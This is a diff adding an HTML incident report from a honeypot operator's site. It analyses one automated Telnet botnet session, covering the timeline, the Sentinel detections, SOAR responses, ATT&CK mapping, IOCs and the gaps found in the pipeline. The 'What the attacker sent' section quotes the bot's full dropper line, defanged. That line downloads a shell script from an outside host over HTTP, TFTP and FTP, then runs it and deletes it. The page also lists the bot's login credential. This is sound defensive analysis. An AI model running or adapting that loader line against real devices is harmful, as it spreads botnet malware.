@@ -1,0 +1,272 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'self'; img-src 'self'; base-uri 'none'; form-action 'none'">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<title>Incident report: a one-second Telnet dropper · Estul Lachin</title>
+<meta name="description" content="One botnet session on my honeypot, from the first packet to the closed incidents: timeline, the detections and SOAR actions it triggered, ATT&amp;CK mapping, IOCs, my verdict, and what it showed me about my own pipeline.">
+<meta property="og:title" content="Incident report: a one-second Telnet dropper">
+<meta property="og:description" content="Timeline, detections, SOAR response, ATT&amp;CK mapping, IOCs and verdict for one real botnet session, plus four gaps it exposed in my pipeline.">
+<meta property="og:url" content="https://uig.me/notes/telnet-dropper-incident/">
+<meta property="og:type" content="article">
+<meta property="og:image" content="https://uig.me/og-image.png">
+<meta name="twitter:card" content="summary_large_image">
+<link rel="canonical" href="https://uig.me/notes/telnet-dropper-incident/">
+<link rel="icon" href="/favicon.svg" type="image/svg+xml">
+<link rel="icon" href="/favicon.ico" sizes="32x32">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+<link rel="stylesheet" href="/style.css">
+</head>
+<body>
+<header class="site-header">
+  <div class="wrap">
+    <a class="brand" href="/">Estul Lachin</a>
+    <nav>
+      <a href="https://lab.uig.me/">Labs</a>
+      <a href="https://lab.uig.me/timeline/">Timeline</a>
+      <a href="https://honeypot.uig.me/">Honeypot</a>
+      <a href="https://detections.uig.me/">Detections</a>
+    </nav>
+  </div>
+</header>
+
+<main class="wrap">
+<article class="article">
+  <p class="kicker"><a href="/">uig.me</a> / notes</p>
+  <h1>Incident report: a one-second Telnet dropper</h1>
+  <p class="meta"><time datetime="2026-11-11">11 November 2026</time> · about 10 minutes</p>
+
+  <p>This is a write-up of one real attack on my <a href="https://honeypot.uig.me/">honeypot</a>, done the way
+    I would hand it to the next shift: what happened, how it was detected, what the automation did, what I
+    concluded and what I would do about it. The attack itself is ordinary, and that is why I picked it. Most of
+    a SOC's day is ordinary attacks, and the work is in confirming them quickly and in noticing what the
+    tooling got wrong along the way.</p>
+
+  <div class="summary">
+    <p class="flow-label">Summary</p>
+    <dl class="kv">
+      <dt>What</dt><dd>An automated Telnet login as <code>root</code>, a router-CLI escape, then a single
+        command line that tries five ways to download a shell script, makes it executable, runs it and deletes it.</dd>
+      <dt>When</dt><dd>2026-11-11 06:55:29 to 06:55:30 UTC. The whole session lasted 1.07 seconds.</dd>
+      <dt>Source</dt><dd>A Korea Telecom fixed-line address, AbuseIPDB score 100/100 (36 reports from 30 users).</dd>
+      <dt>Impact</dt><dd>None. The target is a Cowrie honeypot; its egress filter blocked the download, so
+        nothing ran.</dd>
+      <dt>Detections</dt><dd>6 incidents in Microsoft Sentinel from six rules: four on Cowrie, one on Suricata and one
+        correlating both (3 High, 2 Medium, 1 Low).</dd>
+      <dt>Verdict</dt><dd><strong>True positive.</strong> Automated propagation by a Mirai-style IoT botnet,
+        most likely sent from another infected device. No human operator was involved.</dd>
+    </dl>
+  </div>
+
+  <h2>Sources and scope</h2>
+  <ul>
+    <li><strong>Cowrie</strong> (SSH/Telnet honeypot): every event of the session, as shipped to Sentinel's
+      <code>Cowrie_CL</code> table.</li>
+    <li><strong>Suricata</strong> (passive IDS on the same host): alerts in <code>Suricata_CL</code>.</li>
+    <li><strong>Sentinel</strong> <code>SecurityIncident</code> and <code>SecurityAlert</code>: what the analytics
+      rules raised and what the SOAR playbooks wrote back.</li>
+    <li><strong>AbuseIPDB</strong>, through the enrichment playbook (lookups only; the honeypot never reports).</li>
+    <li>For pivots: the last 30 days of the same tables.</li>
+  </ul>
+  <p>Source addresses are left out of this page, as on all my public honeypot pages. The download host is listed
+    under IOCs, defanged.</p>
+
+  <h2>Timeline (UTC)</h2>
+  <div class="table-wrap">
+  <table class="timeline">
+    <thead><tr><th>Time</th><th>Source</th><th>Event</th></tr></thead>
+    <tbody>
+      <tr><td><code>06:55:28.59</code></td><td>Suricata</td><td>First packet. <em>ET CINS Active Threat
+        Intelligence Poor Reputation IP</em>: the source is already on a public blocklist.</td></tr>
+      <tr><td><code>06:55:29.29</code></td><td>Cowrie</td><td>Telnet connection to port 23.</td></tr>
+      <tr><td><code>06:55:29.53</code></td><td>Cowrie</td><td>Login as <code>root</code> /
+        <code>LSiuY7pOmZG2s</code> accepted. First and only attempt: no failed logins before it.</td></tr>
+      <tr><td><code>06:55:29.63</code></td><td>Cowrie</td><td><code>enable</code>, <code>system</code>,
+        <code>shell</code>, <code>sh</code>: the words that break out of a router's vendor CLI into a Linux
+        shell. All within 0.5 s.</td></tr>
+      <tr><td><code>06:55:30.16</code></td><td>Cowrie</td><td>The dropper command line (below).</td></tr>
+      <tr><td><code>06:55:30.35</code></td><td>Cowrie</td><td>Session closed by the client.</td></tr>
+      <tr><td><code>06:55:30.40</code></td><td>Suricata</td><td><em>ET EXPLOIT Zyxel runCommandInShell Telnet
+        Service Command Injection Attempt (CVE-2024-40891)</em> and <em>ET HUNTING SUSPICIOUS Path to
+        BusyBox</em>, on the same packet.</td></tr>
+      <tr><td><code>06:55:40.35</code></td><td>Cowrie</td><td>Download failed: the honeypot drops all new
+        outbound connections.</td></tr>
+      <tr><td><code>06:56:58</code></td><td>Sentinel</td><td>Suricata alerts ingested.</td></tr>
+      <tr><td><code>07:01:53</code></td><td>Sentinel</td><td><strong>Incident 279</strong>, Network Exploit
+        Attempt (High). Enriched 2 s later, set Active, sent to Telegram.</td></tr>
+      <tr><td><code>07:05:14</code></td><td>Sentinel</td><td>Cowrie events ingested (the shipper runs every
+        10 minutes), 4 minutes after the hourly rules had run.</td></tr>
+      <tr><td><code>08:01:30–57</code></td><td>Sentinel</td><td><strong>Incidents 281 to 285</strong> from the
+        Cowrie rules, each enriched within about 3 s.</td></tr>
+      <tr><td><code>08:04:07</code></td><td>SOAR</td><td>Incident 285 (Low) auto-closed as True Positive.</td></tr>
+    </tbody>
+  </table>
+  </div>
+
+  <h2>What the attacker sent</h2>
+  <p>After the four CLI-escape words, everything happened in one line. I have split it at the semicolons and
+    defanged the host:</p>
+<pre><code>cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;       <span class="c"># first writable directory</span>
+/bin/busybox wget -q -O telnet2.sh hxxp://176[.]65[.]139[.]157/telnet2.sh;
+busybox wget -q -O telnet2.sh hxxp://176[.]65[.]139[.]157/telnet2.sh;
+wget -q -O telnet2.sh hxxp://176[.]65[.]139[.]157/telnet2.sh;
+curl -s -o telnet2.sh hxxp://176[.]65[.]139[.]157/telnet2.sh;
+busybox curl -s -o telnet2.sh hxxp://176[.]65[.]139[.]157/telnet2.sh;
+tftp 176[.]65[.]139[.]157 -c get telnet2.sh;                  <span class="c"># two tftp syntaxes</span>
+tftp -r telnet2.sh -g 176[.]65[.]139[.]157;
+ftpget -v -u anonymous -p anonymous -P 21 176[.]65[.]139[.]157 telnet2.sh telnet2.sh;
+chmod 777 telnet2.sh;                                         <span class="c"># make it executable</span>
+sh telnet2.sh;                                                <span class="c"># run it</span>
+rm -rf telnet2.sh                                             <span class="c"># and remove the evidence</span></code></pre>
+  <p>Reading it as an analyst:</p>
+  <ul>
+    <li><strong>It doesn't know what it landed on.</strong> Eight download methods over HTTP, TFTP and FTP, with
+      and without BusyBox, cover whatever a cheap router or camera happens to ship. A human on a keyboard would
+      have looked first.</li>
+    <li><strong>It doesn't stop to look.</strong> Login to disconnect took 0.8 s, with no pause anywhere that a
+      person would need to read the output. This is a script replaying a fixed sequence.</li>
+    <li><strong>The payload is a stage-one script</strong>, not the bot itself. Loaders like this normally fetch
+      one binary per CPU architecture next, which is why the egress block mattered: there is no second stage
+      to look at, and also nothing to clean up.</li>
+    <li><strong>The source is a fixed-line consumer ISP</strong> with a 100/100 reputation, not a hosting
+      provider. That fits a botnet spreading from devices it has already infected.</li>
+  </ul>
+
+  <h2>What the detections did</h2>
+  <p>The rules are Sigma, converted to KQL and run hourly in Sentinel
+    (<a href="https://detections.uig.me/">detections.uig.me</a>). Each raises one alert per source IP.</p>
+  <div class="table-wrap">
+  <table>
+    <thead><tr><th>Incident</th><th>Rule</th><th>Sensor</th><th>Severity</th><th>SOAR outcome</th></tr></thead>
+    <tbody>
+      <tr><td>279</td><td>Network Exploit Attempt</td><td>Suricata</td><td>High</td><td>Active, assigned, Telegram</td></tr>
+      <tr><td>282</td><td>Download And Execute In One Command</td><td>Cowrie</td><td>High</td><td>Active, assigned, Telegram</td></tr>
+      <tr><td>283</td><td>Login Followed By Tool Transfer</td><td>Cowrie</td><td>High</td><td>Active, assigned, Telegram</td></tr>
+      <tr><td>281</td><td>Blocklisted Source Logs In</td><td>Suricata + Cowrie</td><td>Medium</td><td>New, waiting for an analyst</td></tr>
+      <tr><td>284</td><td>File Deleted Right After It Runs</td><td>Cowrie</td><td>Medium</td><td>New, waiting for an analyst</td></tr>
+      <tr><td>285</td><td>Network Device CLI Escape Attempt</td><td>Cowrie</td><td>Low</td><td>Auto-closed: Low + AbuseIPDB 75–100</td></tr>
+    </tbody>
+  </table>
+  </div>
+  <p>One rule stayed silent on purpose. <em>Permissions Changed To Run Or Unlock A File</em> also matches
+    <code>chmod 777 …; sh …</code>, but it excludes lines that contain a download, so a dropper line is counted
+    once, by <em>Download And Execute</em>. One command should mean one alert.</p>
+  <p>The enrichment playbook wrote the same comment on each incident: the AbuseIPDB result, then the IP's
+    honeypot activity over 30 days (1 session, 1 login, 5 commands, 1 download attempt) with sample commands,
+    and tags <code>abuse:75-100</code> and <code>has-download</code>. That comment is what lets an analyst
+    close the incident without opening a query window.</p>
+
+  <h2>Pivots</h2>
+  <h3>The download host</h3>
+  <p>Searching 30 days of Cowrie logs for <code>176[.]65[.]139[.]157</code> or <code>telnet2.sh</code> finds exactly
+    two sessions: this one, and one on 9 November at 00:01 UTC from a New Zealand mobile carrier's address,
+    also 100/100 on AbuseIPDB. That session logged in as <code>user</code>/<code>user</code> and sent a
+    byte-for-byte identical command line. Same tooling, same infrastructure, two days and two continents apart,
+    which again points to a bot spreading on its own. The earlier session came before the SOAR automation went
+    live (9 November, 15:47 UTC), so it was never enriched.</p>
+  <h3>The password</h3>
+  <p><code>LSiuY7pOmZG2s</code> isn't a factory default, so I checked whether it fingerprints this bot. It
+    appears once more, eleven hours later, from a different source. That session is a different family:
+    it renames the host to <code>PBOC</code>, probes nine directories for write access, and writes a script
+    with hex-escaped <code>echo -ne</code> chunks instead of downloading one. So the password is shared between
+    families, most likely through the same credential lists, and isn't evidence of a single operator.</p>
+  <h3>The CVE</h3>
+  <p>Suricata labelled the command line CVE-2024-40891, a command injection in Zyxel's Telnet service. The
+    signature matches the shape of the payload over Telnet. My honeypot is not a Zyxel device and the attacker
+    logged in normally first, so I read this as "this bot uses the same delivery as the campaigns that exploit
+    that CVE", not as an exploit attempt that could have worked here. In 30 days this signature fired exactly
+    once, on this session.</p>
+
+  <h2>MITRE ATT&amp;CK</h2>
+  <div class="table-wrap">
+  <table>
+    <thead><tr><th>Tactic</th><th>Technique</th><th>Evidence</th></tr></thead>
+    <tbody>
+      <tr><td>Initial Access</td><td>T1078 Valid Accounts</td><td>Telnet login as <code>root</code> on the first try</td></tr>
+      <tr><td>Execution</td><td>T1059.008 Network Device CLI</td><td><code>enable</code>, <code>system</code>, <code>shell</code></td></tr>
+      <tr><td>Execution</td><td>T1059.004 Unix Shell</td><td><code>sh</code>; <code>sh telnet2.sh</code></td></tr>
+      <tr><td>Command and Control</td><td>T1105 Ingress Tool Transfer</td><td>wget, curl, tftp, ftpget of <code>telnet2.sh</code></td></tr>
+      <tr><td>Defense Impairment</td><td>T1222.002 Linux File Permissions Modification</td><td><code>chmod 777 telnet2.sh</code></td></tr>
+      <tr><td>Stealth</td><td>T1070.004 File Deletion</td><td><code>rm -rf telnet2.sh</code> right after running it</td></tr>
+    </tbody>
+  </table>
+  </div>
+  <p>Technique IDs follow ATT&amp;CK v20, where Defense Evasion was split into Stealth and Defense Impairment.</p>
+
+  <h2>IOCs</h2>
+  <div class="table-wrap">
+  <table>
+    <thead><tr><th>Type</th><th>Value</th><th>Note</th></tr></thead>
+    <tbody>
+      <tr><td>URL</td><td><code>hxxp://176[.]65[.]139[.]157/telnet2[.]sh</code></td><td>Stage-one loader. Also tried over TFTP (69/udp) and FTP (21/tcp).</td></tr>
+      <tr><td>IPv4</td><td><code>176[.]65[.]139[.]157</code></td><td>Download host, seen in 2 sessions, 9 and 11 Nov</td></tr>
+      <tr><td>File name</td><td><code>telnet2.sh</code></td><td>Written to /tmp, /var/run, /mnt, /root or /</td></tr>
+      <tr><td>Credential</td><td><code>root</code> / <code>LSiuY7pOmZG2s</code></td><td>Shared with at least one other bot family</td></tr>
+      <tr><td>Suricata</td><td>ET EXPLOIT … CVE-2024-40891</td><td>Fires on this payload over Telnet</td></tr>
+    </tbody>
+  </table>
+  </div>
+  <p>No file hash: the download never completed, so there is no sample. The source addresses are known and
+    withheld here.</p>
+
+  <h2>Assessment</h2>
+  <p><strong>True positive, no impact.</strong> I am highly confident this was automated botnet propagation: the
+    timing, the blind command sequence, the spread of download fallbacks and the identical session from another
+    country all point the same way. That it is Mirai-derived is a <em>medium-confidence</em> call: the CLI escape
+    words and the loader style are typical of that family, but without the second stage I can't name the variant.</p>
+  <p>On a real network, the same session against an exposed router would have been a compromise: the device
+    would have pulled the bot and started scanning for the next victim. The recommendations below are for that
+    case.</p>
+  <ul>
+    <li><strong>Contain:</strong> block the download host at the egress firewall or proxy on every port, not
+      just 80. The loader falls back to TFTP and FTP.</li>
+    <li><strong>Hunt:</strong> search firewall, proxy and DNS logs for any internal host that has contacted
+      <code>176[.]65[.]139[.]157</code>, and treat any hit as an infected device.</li>
+    <li><strong>Harden:</strong> close Telnet (23/tcp) at the perimeter, disable it on devices that offer it,
+      and replace factory and shared credentials. This attack needs nothing more than an open Telnet port and a
+      password from a list.</li>
+    <li><strong>Enrich:</strong> check the URL against URLhaus and VirusTotal for a second stage and hashes.
+      I haven't done that here; it is the next step if this were a live case.</li>
+  </ul>
+
+  <h2>What it showed me about my own pipeline</h2>
+  <p>Working one incident end to end turned up four things I wouldn't have seen from the dashboards.</p>
+  <ol class="steps">
+    <li><strong>Detection took 66 minutes for the Cowrie rules.</strong> The shipper sends every 10 minutes and the
+      rules run hourly on what was ingested in the last hour. The Cowrie events arrived at 07:05, four minutes
+      after the 07:01 run, so they waited for 08:01. Suricata's alert, shipped sooner, became an incident in
+      6 minutes. For the High rules I could run every 10–15 minutes, or move them to near-real-time rules.</li>
+    <li><strong>The first enrichment was stale.</strong> Incident 279 was enriched at 07:01, when the honeypot
+      data wasn't in yet, so its comment says "0 sessions, 0 commands" for an IP that had logged in and run a
+      dropper. The playbook only runs on creation. It should also run when a new alert joins the incident, or
+      the comment should say when its data ends.</li>
+    <li><strong>One session made six incidents and three Telegram messages.</strong> Grouping works per rule,
+      not across rules. For a SOC this is alert fatigue: six tickets to close for one second of activity. The
+      fix is an incident per source IP across all rules, or one correlation rule that raises a single
+      "dropper chain" incident with the others attached as evidence.</li>
+    <li><strong>The same event alerted twice.</strong> Incident 279 holds two alerts an hour apart that contain
+      the identical Suricata record. Across all rules, of the roughly 300 alerts in three days whose event I could
+      extract, 12 repeat an earlier record. Grouping folds them into the existing incident, so nothing was double-counted as an
+      incident, but the one-hour ingestion window evidently overlaps between runs. I haven't confirmed the
+      cause yet.</li>
+  </ol>
+  <p>Smaller notes: incident 284 shows no tactic in Sentinel, because Sentinel's API has no value yet for
+    ATT&amp;CK v20's Stealth tactic (a known limit in <a href="https://github.com/estul-lachin/uig-detections#known-limits">uig-detections</a>);
+    and 285 took 129 s to enrich where the others took 2–3 s.</p>
+  <p>None of these change the verdict on this attack. They change how much I would trust the pipeline's
+    timing and its comments on a busier day, and they are now my next fixes.</p>
+</article>
+</main>
+
+<footer class="site-footer">
+  <div class="wrap">
+    <a href="mailto:hello@uig.me">Email</a> ·
+    <a href="https://www.linkedin.com/in/estul-lachin">LinkedIn</a> ·
+    <a href="https://github.com/estul-lachin">GitHub</a> ·
+    <a href="https://github.com/estul-lachin/uig-home">Source</a>
+  </div>
+</footer>
+</body>
+</html>
